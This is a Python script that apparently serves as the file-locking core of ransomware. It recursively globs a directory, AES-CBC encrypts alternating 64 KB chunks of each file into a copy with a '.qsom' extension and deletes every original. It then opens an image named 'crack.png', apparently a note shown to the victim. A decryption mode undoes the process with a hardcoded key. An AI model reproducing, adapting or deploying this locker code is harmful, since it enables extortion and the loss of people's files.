import glob
import os, random, struct
import timeit
from PIL import Image
from Cryptodome.Cipher import AES
from Cryptodome.Hash import SHA256 as SHA

default_ext = '.qsom'

class AESFull():
    def __init__(self, key, iv, startPath):
        self.startPath = startPath
        hash = SHA.new()
        hash.update(key)
        key = hash.digest()
        self.key = key[:16]

        hash.update(iv)
        iv = hash.digest()
        self.iv = iv[:16]

    def enc(self, in_filename, out_filename=None, chunksize=64*1024):
        if not out_filename:
            out_filename = in_filename + default_ext

        encryptor = AES.new(self.key, AES.MODE_CBC, self.iv)
        filesize = os.path.getsize(in_filename)

        encbin = True
        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(self.iv)

                while True:
                    if encbin == True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0: break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - len(chunk) % 16)
                        encbin = False
                        chunk = encryptor.encrypt(chunk)
                    else :
                        chunk = infile.read(chunksize)
                        encbin = True
                    outfile.write(chunk)

    def dec(self, key, in_filename, out_filename=None, chunksize=64 * 1024):
        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]

        with open(in_filename, 'rb') as infile:
            origin_size = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            self.iv = infile.read(16)
            decryptor = AES.new(self.key, AES.MODE_CBC, self.iv)

            encbin = True
            with open(out_filename, 'wb') as outfile:
                while True:
                    if encbin == True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0: break
                        chunk = decryptor.decrypt(chunk)
                        encbin = False
                    else :
                        chunk = infile.read(chunksize)
                        encbin = True
                    outfile.write(chunk)
                    outfile.truncate(origin_size)

    def work(self, mode, rec_mode=False):
        if mode == 'enc':
            for filename in glob.iglob(self.startPath, recursive=rec_mode):
                if (os.path.isfile(filename)):
                    start = timeit.default_timer()
                    print('Encrypting > ' + filename)
                    self.enc(filename)
                    os.remove(filename)
                    stop = timeit.default_timer()
                    time = stop - start
                    print('[%.4fsec]' % (time))

        elif mode == 'dec':
            for filename in glob.iglob(self.startPath, recursive=rec_mode):
                if (os.path.isfile(filename)):
                    fname, ext = os.path.splitext(filename)
                    if (ext == default_ext):
                        start = timeit.default_timer()
                        print('Decrypting > ' + filename)
                        self.dec(self.key, filename)
                        os.remove(filename)
                        stop = timeit.default_timer()
                        time = stop - start
                        print('[%.4fsec]' % (time))

if __name__ == '__main__':
    keytext = b'keytext'
    ivtext = b'ivtext'
    # startPath = os.getcwd()
    startPath = './testdir/**'

    Fenc = AESFull(keytext, ivtext, startPath)
    Fenc.work('enc')
    # Fenc.work('dec')
    im = Image.open('./System/crack.png')
    im.format = "png"
    im.show()
